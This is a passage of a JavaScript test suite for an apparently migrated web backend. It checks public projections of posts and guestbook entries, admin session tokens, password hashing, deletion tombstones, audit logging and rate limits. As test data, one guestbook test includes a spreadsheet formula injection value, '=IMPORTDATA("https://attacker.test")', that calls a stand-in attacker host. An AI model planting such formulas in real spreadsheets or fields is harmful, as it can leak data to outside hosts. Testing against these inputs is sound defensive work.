import assert from 'node:assert/strict';
import { createHmac, pbkdf2Sync } from 'node:crypto';
import test from 'node:test';
import { fixture, INITIAL_TIME, ADMIN_PASSWORD, GUESTBOOK_PEPPER, sha } from './helpers/worker-fixture.mjs';
import { appsScriptHash } from './helpers/apps-script-crypto.mjs';
import { RATE_LIMITS, enforceContentRateLimit } from '../worker/src/content-rate-limits.js';

const post = (id, status = 'published', extra = {}) => ({
  id, title: `title-${id}`, body: `private-body-${id}`, status, tags: ['한글'],
  createdAt: '2026-07-01T00:00:00.000Z', updatedAt: '2026-07-02T00:00:00.000Z',
  publishedAt: status === 'published' ? '2026-07-01T00:00:00.000Z' : '', storagePath: `posts/${id}.md`, ...extra
});
const guest = (id, extra = {}) => ({ id, name: 'ㅇㅁ', message: `message-${id}`, status: 'visible', createdAt: INITIAL_TIME, passwordSalt: 'salt', passwordHash: 'hash', ...extra });
const storageHeaders = (f) => ({ Authorization: `Bearer ${f.env.STORAGE_SYNC_SECRET}`, Origin: '' });

async function contentError(f, action, payload, message, headers = {}) {
  const result = await f.request(action, payload, headers);
  assert.equal(result.status, 200, JSON.stringify(result));
  assert.equal(result.ok, false, JSON.stringify(result));
  assert.match(result.error, message);
  return result;
}

test('public posts expose full published rows, only suppression fields for other statuses and permanent tombstones', async (t) => {
  const f = await fixture(t);
  await f.seed('posts', [
    post('public', 'published', { markdownBaseUrl: 'https://storage.test/posts/', markdownRootUrl: 'https://storage.test/', extraColumn: 'keep extension' }),
    post('draft', 'draft'), post('hidden', 'hidden'), post('empty', '', { updatedAt: '' }),
    post('stale'), post('finalized-stale')
  ]);
  await f.seed('postDeletions', [
    { id: 'stale', nonce: 'private-nonce', deletedAt: INITIAL_TIME, storagePath: 'private/path' },
    { id: 'finalized-stale', nonce: 'secret', deletedAt: INITIAL_TIME, finalizedAt: INITIAL_TIME }
  ]);
  const records = await f.call('post.listPublic');
  assert.deepEqual(records[0], (await f.admin('admin.post.list'))[0]);
  assert.equal(records[0].markdownBaseUrl, 'https://storage.test/posts/');
  assert.equal(records[0].markdownRootUrl, 'https://storage.test/');
  assert.equal(records[0].extraColumn, 'keep extension');
  assert.deepEqual(records.slice(1), [
    { id: 'draft', status: 'draft', updatedAt: '2026-07-02T00:00:00.000Z' },
    { id: 'hidden', status: 'hidden', updatedAt: '2026-07-02T00:00:00.000Z' },
    { id: 'empty', status: 'hidden', updatedAt: '2026-07-01T00:00:00.000Z' },
    { id: 'stale', status: 'deleted', updatedAt: INITIAL_TIME },
    { id: 'finalized-stale', status: 'deleted', updatedAt: INITIAL_TIME }
  ]);
  for (const secret of ['private-body-draft', 'private-body-hidden', 'private-body-stale', 'private-nonce', 'private/path']) assert.equal(JSON.stringify(records).includes(secret), false);
});

test('public guestbook only includes visible projected rows, with default names and no credential or moderation fields', async (t) => {
  const f = await fixture(t);
  await f.seed('guestbook', [guest('blank', { name: '   ', hiddenReason: 'private reason' }), guest('named', { name: ' 이름 ' }), guest('hidden', { status: 'hidden' })]);
  const records = await f.call('guestbook.listPublic');
  assert.deepEqual(records, [
    { id: 'blank', name: 'ㅇㅁ', message: 'message-blank', status: 'visible', createdAt: INITIAL_TIME },
    { id: 'named', name: '이름', message: 'message-named', status: 'visible', createdAt: INITIAL_TIME }
  ]);
  const admin = await f.admin('admin.guestbook.list');
  assert.equal(admin.length, 3); assert.equal(admin[0].hiddenReason, 'private reason');
  assert.equal(JSON.stringify(admin).includes('password'), false);
});

test('public asset overrides deliberately include visible, hidden and deleted metadata and retain tags as array or string', async (t) => {
  const f = await fixture(t);
  await f.seed('assetOverrides', [
    { assetId: 'visible', status: 'visible', tags: ['한글'], sortOrder: 4.5 },
    { assetId: 'hidden', status: 'hidden', description: 'still in override contract', tags: 'legacy,tags' },
    { assetId: 'deleted', status: 'deleted', tags: '' }
  ]);
  const records = await f.call('assetOverride.listPublic');
  assert.deepEqual(records, await f.admin('admin.assetOverride.list'));
  assert.deepEqual(records, await f.storage('storage.sync.assetOverride.list'));
  assert.deepEqual(records.map((r) => r.tags), [['한글'], 'legacy,tags', '']);
  assert.equal(records[0].sortOrder, 4.5);
});

test('public things filter hidden and idless rows, project fields and sort by order, Korean title order and id', async (t) => {
  const f = await fixture(t);
  await f.seed('things', [
    { id: 'z', title: 'Zulu', status: 'visible', sortOrder: 20, internalNote: 'secret' },
    { id: 'hidden', status: 'hidden', sortOrder: -1 },
    { id: 'b', title: 'Alpha', status: 'visible', sortOrder: 20, imageUrl: 'https://images.test/a.png' },
    { id: 'a', title: 'Alpha', status: 'visible', sortOrder: 20 },
    { id: 'hangul', title: '공든탑', status: 'visible', sortOrder: 20 },
    { id: 'first', title: 'First', status: 'visible', sortOrder: '' },
    { id: '', title: 'No id', status: 'visible', sortOrder: -2 }
  ]);
  const records = await f.call('thing.listPublic');
  // Production Apps Script listed 공든탑 before Anniary: Hangul sorts before Latin.
  assert.deepEqual(records.map((r) => r.id), ['first', 'hangul', 'a', 'b', 'z']);
  assert.deepEqual(Object.keys(records[0]).sort(), ['description', 'id', 'imageUrl', 'sortOrder', 'status', 'title', 'updatedAt', 'url']);
  assert.equal(records[3].imageUrl, 'https://images.test/a.png');
  assert.equal(records[0].sortOrder, 0);
  assert.equal(JSON.stringify(records).includes('internalNote'), false);
  assert.equal((await f.admin('admin.thing.list'))[0].internalNote, 'secret');
});

test('guestbook defaults and trimming, UTF-16 length limits match Code.js and text is stored as typed', async (t) => {
  const f = await fixture(t);
  const entry = await f.create({ name: '   ', message: '  안녕하세요  ' });
  assert.equal(entry.name, 'ㅇㅁ'); assert.equal(entry.message, '안녕하세요');
  const long = await f.create({ name: ' 이름'.repeat(30), message: '가'.repeat(1001) });
  assert.equal(long.name.length, 40); assert.equal(long.message.length, 1000);
  const formula = await f.create({ name: '+SUM(A1:A2)', message: '=IMPORTDATA("https://attacker.test")' });
  assert.equal(formula.name, '+SUM(A1:A2)'); assert.equal(formula.message[0], '=');
  const stored = (await f.rows('guestbook_entries'))[2];
  // Sheets dropped Code.js's protective apostrophe on read; D1 must not keep one either.
  assert.equal(stored.name, '+SUM(A1:A2)'); assert.equal(stored.message, formula.message);
  assert.deepEqual((await f.call('guestbook.listPublic')).map((entry) => entry.message).slice(-1), [formula.message]);
  assert.equal(stored.passwordHashAlgorithm, 'SHA-256+salt+pepper');
  assert.equal(stored.passwordHashIterations, 1);
  assert.equal(stored.passwordHash, sha(`${stored.passwordSalt}:delete-password:${GUESTBOOK_PEPPER}`));
});

test('guestbook message/password remain mandatory and honeypot rejects before content counters or writes', async (t) => {
  const f = await fixture(t);
  for (const invalid of [{ message: '   ' }, { deletePassword: '' }, { website: 'https://spam.test' }]) {
    await contentError(f, 'guestbook.create', { message: 'hello', deletePassword: 'password', turnstileToken: 'guest-turnstile', ...invalid }, /메시지와 비밀번호|요청을 처리할 수 없습니다/);
  }
  assert.deepEqual(await f.rows('rate_limit_windows'), []);
  assert.deepEqual(await f.rows('guestbook_entries'), []);
  assert.deepEqual(await f.rows('guestbook_entry_ips'), []);
});

test('hideByPassword verifies signed-byte Apps Script SHA-256 and PBKDF2 50000 UTF-8 vectors exactly', async (t) => {
  const f = await fixture(t);
  const password = '삭제🔑비밀번호 e\u0301';
  const salt = '솔트🔐-uuid';
  for (const [id, algorithm, iterations] of [
    ['sha', 'SHA-256+salt+pepper', 1], ['pbkdf', 'PBKDF2-HMAC-SHA256+pepper', 50000], ['old', '', '']
  ]) {
    const passwordHash = appsScriptHash(password, salt, algorithm, iterations, GUESTBOOK_PEPPER);
    assert.match(passwordHash, /^[0-9a-f]{64}$/);
    if (id === 'pbkdf') assert.equal(passwordHash, pbkdf2Sync(password + GUESTBOOK_PEPPER, Buffer.from(salt, 'utf8'), 50000, 32, 'sha256').toString('hex'));
    await f.seed('guestbook', [guest(id, { passwordSalt: salt, passwordHash, passwordHashAlgorithm: algorithm, passwordHashIterations: iterations, hiddenReason: 'keep moderation reason' })]);
    await f.mapping(id);
    await contentError(f, 'guestbook.hideByPassword', { id, deletePassword: 'wrong', clientId: `client-wrong-${id}-0001` }, /삭제용 비밀번호가 맞지 않습니다/);
    assert.deepEqual(await f.call('guestbook.hideByPassword', { id, deletePassword: password, clientId: `client-right-${id}-0001` }), { id });
    const row = await f.db.prepare('SELECT * FROM guestbook_entries WHERE id = ?').bind(id).first();
    assert.equal(row.status, 'hidden'); assert.equal(row.passwordHash, passwordHash); assert.equal(row.hiddenReason, 'keep moderation reason');
  }
  assert.equal((await f.rows('guestbook_entry_ips')).length, 3);
  assert.deepEqual(await f.rows('audit_log'), [], 'password hides have no audit event in Code.js');
});

test('PBKDF2 entries without an iteration cell use the configured fallback, and new entries still use SHA-256', async (t) => {
  const f = await fixture(t, { env: { GUESTBOOK_PASSWORD_ITERATIONS: '13' } });
  const passwordHash = appsScriptHash('pw', 'salt', 'PBKDF2-HMAC-SHA256+pepper', '', GUESTBOOK_PEPPER, '13');
  await f.seed('guestbook', [guest('fallback', { passwordHash, passwordHashAlgorithm: 'PBKDF2-HMAC-SHA256+pepper' })]);
  await f.call('guestbook.hideByPassword', { id: 'fallback', deletePassword: 'pw' });
  await f.create();
  assert.equal((await f.rows('guestbook_entries'))[1].passwordHashIterations, 1);
});

test('hideByPassword preserves required/id-not-found errors and idempotently hides an already hidden entry', async (t) => {
  const f = await fixture(t);
  await contentError(f, 'guestbook.hideByPassword', {}, /Guestbook entry id is required/);
  await contentError(f, 'guestbook.hideByPassword', { id: 'x' }, /비밀번호를 입력해야 합니다/);
  await contentError(f, 'guestbook.hideByPassword', { id: 'x', deletePassword: 'pw' }, /Guestbook entry not found/);
  const entry = await f.create();
  const body = { id: entry.id, deletePassword: 'delete-password' };
  await f.call('guestbook.hideByPassword', body); await f.call('guestbook.hideByPassword', body);
  assert.deepEqual(await f.call('guestbook.listPublic'), []);
});

test('admin login accepts the copied hash and pepper, defaults to ten minutes, verifies HMAC and never needs plaintext config', async (t) => {
  const f = await fixture(t);
  delete f.env.ADMIN_SESSION_TTL_MS;
  assert.equal('ADMIN_PASSWORD' in f.env, false);
  await contentError(f, 'admin.login', { password: 'wrong', turnstileToken: 'admin-turnstile' }, /관리자 비밀번호가 맞지 않습니다/);
  const session = await f.call('admin.login', { password: ADMIN_PASSWORD, turnstileToken: 'admin-turnstile' });
  assert.equal(Date.parse(session.expiresAt), f.now() + 600000);
  const [payload, signature] = session.token.split('.');
  assert.equal(signature, createHmac('sha256', f.env.ADMIN_SESSION_SECRET).update(payload).digest('hex'));
  assert.deepEqual(await f.call('admin.session.verify', { token: session.token }), { valid: true });
  assert.deepEqual((await f.rows('audit_log')).map(({ action, targetType, targetId }) => ({ action, targetType, targetId })), [{ action: 'admin.login', targetType: 'admin', targetId: '' }]);
});

test('session refresh extends expiry with a new nonce, inclusive expiry boundary and tamper/missing rejection', async (t) => {
  const f = await fixture(t, { env: { ADMIN_SESSION_TTL_MS: '120000' } });
  const session = await f.call('admin.login', { password: ADMIN_PASSWORD, turnstileToken: 'admin-turnstile' });
  f.advance(60000);
  const renewed = await f.call('admin.session.refresh', { token: session.token });
  assert.notEqual(renewed.token, session.token);
  assert.equal(Date.parse(renewed.expiresAt), f.now() + 120000);
  f.advance(60000);
  await f.call('admin.session.verify', { token: session.token });
  f.advance(1);
  await contentError(f, 'admin.session.verify', { token: session.token }, /Admin session expired/);
  await contentError(f, 'admin.session.refresh', { token: session.token }, /Admin session expired/);
  await f.call('admin.session.verify', { token: renewed.token });
  await contentError(f, 'admin.session.verify', { token: renewed.token.slice(0, -1) + (renewed.token.endsWith('0') ? '1' : '0') }, /Invalid admin session/);
  await contentError(f, 'admin.session.verify', {}, /Admin session is required/);
  f.advance(60000);
  await contentError(f, 'admin.session.verify', { token: renewed.token }, /Admin session expired/);
});

test('all data admin actions require sessions and missing copied secrets retain the security config error', async (t) => {
  const f = await fixture(t);
  for (const action of ['admin.post.list', 'admin.guestbook.list', 'admin.assetOverride.list', 'admin.thing.list', 'admin.post.save', 'admin.assetOverride.save', 'admin.guestbook.hide', 'admin.guestbook.restore']) {
    await contentError(f, action, {}, /Admin session is required/);
  }
  f.env.ADMIN_PASSWORD_PEPPER = 'short';
  await contentError(f, 'admin.login', { password: ADMIN_PASSWORD, turnstileToken: 'admin-turnstile' }, /Server security config is missing/);
  f.env.GUESTBOOK_SERVER_PEPPER = '';
  await contentError(f, 'guestbook.create', { message: 'x', deletePassword: 'pw', turnstileToken: 'guest-turnstile' }, /Server security config is missing/);
  f.env.ADMIN_SESSION_SECRET = '';
  await contentError(f, 'admin.session.verify', { token: 'signed.token' }, /Server security config is missing/);
});

test('post admin saves preserve dates/tags contract and replace omitted cells instead of merging them', async (t) => {
  const f = await fixture(t);
  const created = await f.admin('admin.post.save', { post: { title: 'new', body: 'body', status: 'published', tags: 'not-an-array', markdownBaseUrl: 'https://storage.test/base/', markdownRootUrl: 'https://storage.test' } });
  assert.ok(created.id); assert.deepEqual(created.tags, []);
  assert.equal(created.createdAt, INITIAL_TIME); assert.equal(created.updatedAt, INITIAL_TIME); assert.equal(created.publishedAt, INITIAL_TIME);
  f.advance(1000);
  const updated = await f.admin('admin.post.save', { post: { id: created.id, title: 'changed', status: 'draft', createdAt: created.createdAt } });
  assert.equal(updated.publishedAt, '');
  const listed = (await f.admin('admin.post.list'))[0];
  assert.equal(listed.body, ''); assert.equal(listed.markdownBaseUrl, ''); assert.equal(listed.markdownRootUrl, '');
  assert.equal(listed.createdAt, created.createdAt); assert.equal(listed.updatedAt, f.deps.nowIso());
});

test('storage post saves preserve supplied timestamps and normalize tags/source/sync status with legacy fallbacks', async (t) => {
  const f = await fixture(t);
  const input = { id: ' storage-post ', title: 'title', body: 'body', status: ' published ', tags: [' tag '], createdAt: '2026-01-01', updatedAt: '2026-02-01', publishedAt: '2026-01-02', storagePath: 'posts/p.md', bodyUrl: 'https://storage.test/p.md' };
  const saved = await f.storage('storage.sync.post.save', { post: input });
  assert.deepEqual(saved, { ...input, id: 'storage-post', status: 'published', tags: ['tag'], source: 'storage', syncStatus: 'synced' });
  const fallback = await f.storage('storage.sync.post.save', { post: { id: 'fallback', status: 'draft', publishedAt: '2026-01-01' } });
  assert.equal(fallback.createdAt, '2026-01-01'); assert.equal(fallback.updatedAt, '2026-01-01');
  assert.equal(fallback.publishedAt, '2026-01-01');
  const absent = await f.storage('storage.sync.post.save', { post: { id: 'absent', status: 'draft' } });
  assert.equal(absent.publishedAt, ''); assert.equal(absent.createdAt, INITIAL_TIME);
  assert.deepEqual(await f.storage('storage.sync.post.list'), await f.admin('admin.post.list'));
});

test('post bulk status changes only status/dates, reports missing ids and sets publication dates only once', async (t) => {
  const f = await fixture(t);
  await f.seed('posts', [post('p'), post('draft', 'draft'), post('hidden', 'hidden')]);
  assert.deepEqual(await f.admin('admin.post.bulkStatus', { ids: ['p', 'draft', 'missing'], status: 'hidden' }), { updatedIds: ['p', 'draft'], missingIds: ['missing'] });
  const rows = await f.admin('admin.post.list');
  assert.equal(rows[0].body, 'private-body-p'); assert.equal(rows[0].publishedAt, '2026-07-01T00:00:00.000Z');
  await f.admin('admin.post.bulkStatus', { ids: ['draft'], status: 'published' });
  f.advance(1000);
  await f.admin('admin.post.bulkStatus', { ids: ['draft'], status: 'published' });
  assert.equal((await f.admin('admin.post.list'))[1].publishedAt, INITIAL_TIME);
  assert.equal((await f.call('post.listPublic'))[0].body, undefined);
});

test('post deletion preserves nonadjacent rows, repairs incomplete tombstones and preserves nonce/date on retry', async (t) => {
  const f = await fixture(t);
  await f.seed('posts', ['p1', 'p2', 'p3', 'p4', 'repair'].map((id) => post(id)));
  await f.seed('postDeletions', [
    { id: 'p4', nonce: 'existing-nonce', deletedAt: '2026-07-09' }, { id: 'repair' }
  ]);
  assert.deepEqual(await f.admin('admin.post.bulkDelete', { ids: ['p2', 'p4', 'repair', 'missing'] }), { deletedIds: ['p2', 'p4', 'repair'], alreadyMissingIds: ['missing'] });
  assert.deepEqual((await f.admin('admin.post.list')).map((r) => r.id), ['p1', 'p3']);
  const tombstones = await f.storage('storage.sync.postDeletion.list');
  assert.deepEqual(tombstones.map((r) => r.id), ['p4', 'repair', 'p2', 'missing']);
  assert.equal(tombstones[0].nonce, 'existing-nonce'); assert.equal(tombstones[0].deletedAt, '2026-07-09');
  assert.equal(tombstones[0].storagePath, 'posts/p4.md'); assert.ok(tombstones[1].nonce); assert.equal(tombstones[1].deletedAt, INITIAL_TIME);
  f.advance(1000);
  assert.deepEqual(await f.admin('admin.post.bulkDelete', { ids: ['p2', 'p4', 'repair', 'missing'] }), { deletedIds: [], alreadyMissingIds: ['p2', 'p4', 'repair', 'missing'] });
  assert.deepEqual(await f.storage('storage.sync.postDeletion.list'), tombstones);
  assert.deepEqual((await f.rows('audit_log')).map((r) => r.targetId), ['p2', 'p4', 'repair']);
});

test('finalize validates every nonce before any mutation, is idempotent, retains suppression and blocks all resurrection', async (t) => {
  const f = await fixture(t);
  await f.seed('posts', [post('p')]);
  await f.admin('admin.post.bulkDelete', { ids: ['p', 'missing'] });
  const tombstones = await f.storage('storage.sync.postDeletion.list');
  for (const id of ['p', 'missing']) {
    await contentError(f, 'admin.post.save', { token: f.session(), post: post(id, 'draft') }, /permanently deleted/);
    await contentError(f, 'storage.sync.post.save', { post: post(id) }, /permanently deleted/, storageHeaders(f));
  }
  const pairs = tombstones.map(({ id, nonce }) => ({ id, nonce }));
  await contentError(f, 'storage.sync.postDeletion.finalize', { deletions: [pairs[0], { id: pairs[1].id, nonce: 'wrong' }] }, /nonce is invalid/, storageHeaders(f));
  assert.equal((await f.storage('storage.sync.postDeletion.list')).length, 2);
  assert.ok((await f.rows('post_deletions')).every((r) => r.finalizedAt === ''));
  assert.deepEqual(await f.storage('storage.sync.postDeletion.finalize', { deletions: [...pairs, { id: 'absent', nonce: 'any' }] }), { finalizedIds: ['p', 'missing'], alreadyMissingIds: ['absent'] });
  assert.deepEqual(await f.storage('storage.sync.postDeletion.list'), []);
  assert.equal((await f.rows('post_deletions')).length, 2);
  assert.deepEqual((await f.call('post.listPublic')).map((r) => r.status), ['deleted', 'deleted']);
  assert.deepEqual(await f.storage('storage.sync.postDeletion.finalize', { deletions: pairs.map((r) => ({ ...r, nonce: 'even-wrong-on-finalized' })) }), { finalizedIds: [], alreadyMissingIds: ['p', 'missing'] });
  await contentError(f, 'admin.post.save', { token: f.session(), post: post('p') }, /permanently deleted/);
  await contentError(f, 'storage.sync.post.save', { post: post('missing') }, /permanently deleted/, storageHeaders(f));
});

test('post deletion is atomic on SQL failure and concurrent stale saves never revive a tombstoned id', async (t) => {
  const f = await fixture(t);
  await f.seed('posts', [post('fail')]);
  await f.db.prepare("CREATE TRIGGER fail_post_delete BEFORE DELETE ON posts BEGIN SELECT RAISE(ABORT, 'failure'); END").run();
  assert.equal((await f.request('admin.post.bulkDelete', { token: f.session(), ids: ['fail'] })).status, 503);
  assert.equal((await f.rows('posts')).length, 1); assert.equal((await f.rows('post_deletions')).length, 0);
  await f.db.prepare('DROP TRIGGER fail_post_delete').run();
  for (let i = 0; i < 8; i++) {
    const id = `race-${i}`;
    const [saved, deleted] = await Promise.all([
      f.request('storage.sync.post.save', { post: post(id) }, storageHeaders(f)),
      f.request('admin.post.bulkDelete', { token: f.session(), ids: [id] })
    ]);
    assert.equal(deleted.ok, true); assert.equal(saved.status, 200);
    if (!saved.ok) assert.match(saved.error, /permanently deleted/);
    assert.equal(await f.db.prepare('SELECT * FROM posts WHERE id = ?').bind(id).first(), null);
    assert.ok(await f.db.prepare('SELECT * FROM post_deletions WHERE id = ?').bind(id).first());
  }
});

test('guestbook hide/restore and bulk status preserve content/hash; deletes are idempotent', async (t) => {
  const f = await fixture(t);
  await f.seed('guestbook', ['g1', 'g2', 'g3'].map((id) => guest(id)));
  assert.deepEqual(await f.admin('admin.guestbook.hide', { id: 'g1', hiddenReason: ' single reason ' }), { id: 'g1' });
  assert.equal((await f.rows('guestbook_entries'))[0].hiddenReason, ' single reason ');
  await f.admin('admin.guestbook.restore', { id: 'g1' });
  assert.equal((await f.rows('guestbook_entries'))[0].hiddenReason, '');
  assert.deepEqual(await f.admin('admin.guestbook.bulkStatus', { ids: ['g1', 'g3', 'missing'], status: 'hidden', hiddenReason: ' spam ' }), { updatedIds: ['g1', 'g3'], missingIds: ['missing'] });
  const rows = await f.rows('guestbook_entries');
  assert.equal(rows[0].passwordHash, 'hash'); assert.equal(rows[0].message, 'message-g1'); assert.equal(rows[0].hiddenReason, 'spam');
  await f.admin('admin.guestbook.bulkStatus', { ids: ['g1'], status: 'visible' });
  assert.equal((await f.rows('guestbook_entries'))[0].hiddenReason, '');
  assert.deepEqual(await f.admin('admin.guestbook.bulkDelete', { ids: ['g1', 'g3', 'missing'] }), { deletedIds: ['g1', 'g3'], alreadyMissingIds: ['missing'] });
  assert.deepEqual((await f.rows('guestbook_entries')).map((r) => r.id), ['g2']);
  assert.deepEqual(await f.admin('admin.guestbook.bulkDelete', { ids: ['g1', 'g3'] }), { deletedIds: [], alreadyMissingIds: ['g1', 'g3'] });
  for (const action of ['admin.guestbook.hide', 'admin.guestbook.restore']) await contentError(f, action, { token: f.session(), id: 'missing' }, /Guestbook entry not found/);
});

test('asset status patches metadata, creates minimal overrides and reset deletes are idempotent', async (t) => {
  const f = await fixture(t);
  await f.seed('assetOverrides', [{ assetId: 'a1', displayName: 'keep', description: 'note', tags: ['tag'], sortOrder: 3, status: 'visible' }, { assetId: 'a2', status: 'hidden' }, { assetId: 'a3' }]);
  assert.deepEqual(await f.admin('admin.assetOverride.bulkStatus', { ids: ['a1', 'new'], status: 'deleted' }), { updatedIds: ['a1', 'new'], missingIds: [] });
  const rows = await f.call('assetOverride.listPublic');
  assert.equal(rows[0].displayName, 'keep'); assert.equal(rows[0].description, 'note'); assert.deepEqual(rows[0].tags, ['tag']); assert.equal(rows[0].sortOrder, 3);
  assert.equal(rows[3].displayName, ''); assert.equal(rows[3].status, 'deleted');
  assert.deepEqual(await f.admin('admin.assetOverride.delete', { ids: ['a1', 'a3', 'new', 'missing'] }), { deletedIds: ['a1', 'a3', 'new'], alreadyMissingIds: ['missing'] });
  assert.deepEqual(await f.storage('storage.sync.assetOverride.delete', { ids: ['a1', 'a3'] }), { deletedIds: [], alreadyMissingIds: ['a1', 'a3'] });
  assert.deepEqual((await f.call('assetOverride.listPublic')).map((r) => r.assetId), ['a2']);
});

test('admin and storage asset saves replace rows with the same updatedAt and validation semantics', async (t) => {
  const f = await fixture(t);
  await contentError(f, 'admin.assetOverride.save', { token: f.session(), override: {} }, /assetId is required/);
  const original = await f.admin('admin.assetOverride.save', { override: { assetId: 'a', description: 'keep only until replace', tags: ['old'], status: 'hidden' } });
  assert.equal(original.updatedAt, INITIAL_TIME);
  f.advance(1000);
  const next = await f.storage('storage.sync.assetOverride.save', { override: { assetId: ' a ', displayName: 'new', tags: [' tag '], status: ' visible ', sortOrder: 4.5 } });
  assert.deepEqual(next, { assetId: 'a', displayName: 'new', tags: ['tag'], status: 'visible', sortOrder: 4.5, updatedAt: f.deps.nowIso() });
  assert.equal((await f.call('assetOverride.listPublic'))[0].description, '');
});

test('thing mutations immediately change public projection, keep control/title validation and store text as typed', async (t) => {
  const f = await fixture(t);
  const value = { title: ' New thing ', description: 'description', url: 'https://example.test', imageUrl: 'https://image.test/one.png', status: 'visible', sortOrder: 10 };
  const thing = await f.admin('admin.thing.save', { thing: value });
  assert.equal((await f.call('thing.listPublic'))[0].title, 'New thing');
  await f.admin('admin.thing.save', { thing: { ...value, id: thing.id, imageUrl: '', status: 'hidden' } });
  assert.deepEqual(await f.call('thing.listPublic'), []);
  await contentError(f, 'admin.thing.save', { token: f.session(), thing: { ...value, title: 'bad\nline' } }, /Invalid thing title/);
  await contentError(f, 'admin.thing.save', { token: f.session(), thing: { ...value, url: 'https://a..test/' } }, /valid hostname/);
  const formula = await f.admin('admin.thing.save', { thing: { ...value, title: '=HYPERLINK("https://test")', description: '@SUM(A1:A2)' } });
  assert.equal(formula.description, '@SUM(A1:A2)');
  assert.equal((await f.admin('admin.thing.list'))[1].description, '@SUM(A1:A2)');
  assert.equal((await f.admin('admin.thing.list'))[1].title, '=HYPERLINK("https://test")');
  assert.deepEqual(await f.admin('admin.thing.delete', { ids: [thing.id, 'missing'] }), { deletedIds: [thing.id], alreadyMissingIds: ['missing'] });
  assert.deepEqual(await f.admin('admin.thing.delete', { ids: [thing.id] }), { deletedIds: [], alreadyMissingIds: [thing.id] });
});

test('all audit event names and targets match legacy mutations and audit failure never rolls back a successful write', async (t) => {
  const f = await fixture(t);
  await f.admin('admin.post.save', { post: post('p') });
  await f.storage('storage.sync.post.save', { post: post('s') });
  await f.admin('admin.post.bulkStatus', { ids: ['p'], status: 'draft' });
  await f.admin('admin.post.bulkDelete', { ids: ['p'] });
  const [{ id, nonce }] = await f.storage('storage.sync.postDeletion.list');
  await f.storage('storage.sync.postDeletion.finalize', { deletions: [{ id, nonce }] });
  await f.seed('guestbook', [guest('g')]);
  await f.admin('admin.guestbook.hide', { id: 'g' }); await f.admin('admin.guestbook.restore', { id: 'g' });
  await f.admin('admin.guestbook.bulkStatus', { ids: ['g'], status: 'hidden', hiddenReason: 'spam' });
  await f.admin('admin.guestbook.bulkDelete', { ids: ['g'] });
  await f.admin('admin.assetOverride.save', { override: { assetId: 'a' } });
  await f.admin('admin.assetOverride.bulkStatus', { ids: ['a'], status: 'hidden' });
  await f.admin('admin.assetOverride.delete', { ids: ['a'] });
  await f.admin('admin.thing.save', { thing: { id: 't', title: 'thing', url: 'https://t.test/', status: 'visible', sortOrder: 1 } });
  await f.admin('admin.thing.delete', { ids: ['t'] });
  assert.deepEqual((await f.rows('audit_log')).map((r) => [r.action, r.targetType, r.targetId]), [
    ['post.save', 'post', 'p'], ['post.syncFromStorage', 'post', 's'], ['post.bulkStatus', 'post', 'p'], ['post.bulkDelete', 'post', 'p'], ['postDeletion.finalize', 'post', 'p'],
    ['guestbook.hide', 'guestbook', 'g'], ['guestbook.restore', 'guestbook', 'g'], ['guestbook.bulkStatus', 'guestbook', 'g'], ['guestbook.bulkDelete', 'guestbook', 'g'],
    ['assetOverride.update', 'asset', 'a'], ['assetOverride.bulkStatus', 'asset', 'a'], ['assetOverride.delete', 'asset', 'a'], ['thing.save', 'thing', 't'], ['thing.delete', 'thing', 't']
  ]);
  await f.db.prepare("CREATE TRIGGER fail_audit BEFORE INSERT ON audit_log BEGIN SELECT RAISE(ABORT, 'failure'); END").run();
  await f.admin('admin.post.save', { post: post('audit-fail') });
  assert.ok((await f.admin('admin.post.list')).some((p) => p.id === 'audit-fail'));
});

for (const [name, rule] of Object.entries(RATE_LIMITS)) {
  test(`D1 rate window ${name} enforces its limit, counts rejections, and resets exactly at expiry`, async (t) => {
    const f = await fixture(t);
    for (let i = 0; i < rule.limit; i++) await enforceContentRateLimit(f.db, rule, f.deps);
    await assert.rejects(enforceContentRateLimit(f.db, rule, f.deps), { message: rule.message });
    let row = await f.db.prepare('SELECT * FROM rate_limit_windows WHERE key = ?').bind(rule.key).first();
    assert.equal(row.count, rule.limit + 1); assert.equal(row.reset_at, f.now() + rule.windowSeconds * 1000);
    f.advance(rule.windowSeconds * 1000 - 1);
    await assert.rejects(enforceContentRateLimit(f.db, rule, f.deps), { message: rule.message });
    f.advance(1);
    await enforceContentRateLimit(f.db, rule, f.deps);
    row = await f.db.prepare('SELECT * FROM rate_limit_windows WHERE key = ?').bind(rule.key).first();
    assert.equal(row.count, 1); assert.equal(row.reset_at, f.now() + rule.windowSeconds * 1000);
  });
}

test('atomic D1 counters cannot be bypassed by concurrent attempts', async (t) => {
  const f = await fixture(t);
  const attempts = await Promise.allSettled(Array.from({ length: 12 }, () => enforceContentRateLimit(f.db, RATE_LIMITS.guestbookCreateBurst, f.deps)));
  assert.equal(attempts.filter((r) => r.status === 'fulfilled').length, 1);
  assert.equal((await f.rows('rate_limit_windows'))[0].count, 12);
});

test('guestbook limits scope bursts/hourly windows per browser and use password fallback for invalid client ids', async (t) => {
  const f = await fixture(t);
  await f.create({ clientId: 'guestbook-client-0001', message: 'first' });
  await f.create({ clientId: 'guestbook-client-0002', message: 'second' });
  const body = { clientId: 'guestbook-client-0001', message: 'third', deletePassword: 'pw', turnstileToken: 'guest-turnstile' };
  await contentError(f, 'guestbook.create', body, /작성이 너무 빠릅니다/);
  f.advance(10000);
  for (let i = 1; i < 12; i++) { await f.create({ clientId: 'guestbook-client-0001', message: `unique-${i}` }); f.advance(10000); }
  await contentError(f, 'guestbook.create', { ...body, message: 'hourly overflow' }, /작성이 너무 많습니다/);
  await f.create({ clientId: 'bad.id', deletePassword: 'same', message: 'fallback1' });
  await contentError(f, 'guestbook.create', { ...body, clientId: '', deletePassword: 'same', message: 'fallback2' }, /작성이 너무 빠릅니다/);
  await f.create({ clientId: '', deletePassword: 'different', message: 'fallback3' });
});

test('duplicate windows normalize whitespace/case and truncate before hashing; short greetings remain shareable', async (t) => {
  const f = await fixture(t);
  const input = { clientId: 'guestbook-client-0001', message: 'Same   Message', deletePassword: 'pw', turnstileToken: 'guest-turnstile' };
  await f.call('guestbook.create', input); f.advance(10000);
  await contentError(f, 'guestbook.create', { ...input, message: ' same message ' }, /같은 메시지가 반복/);
  for (let i = 0; i < 3; i++) await f.create({ message: '안녕' });
  await f.create({ message: 'This is the same long guestbook message' });
  await f.create({ message: ' this  is THE same long guestbook message ' });
  await contentError(f, 'guestbook.create', { ...input, clientId: 'guestbook-client-0009', message: 'THIS IS THE SAME LONG GUESTBOOK MESSAGE' }, /같은 긴 메시지가 반복/);
  const prefix = '가'.repeat(1000);
  const first = await f.create({ message: `${prefix}A` });
  const second = await f.create({ message: `${prefix}B` });
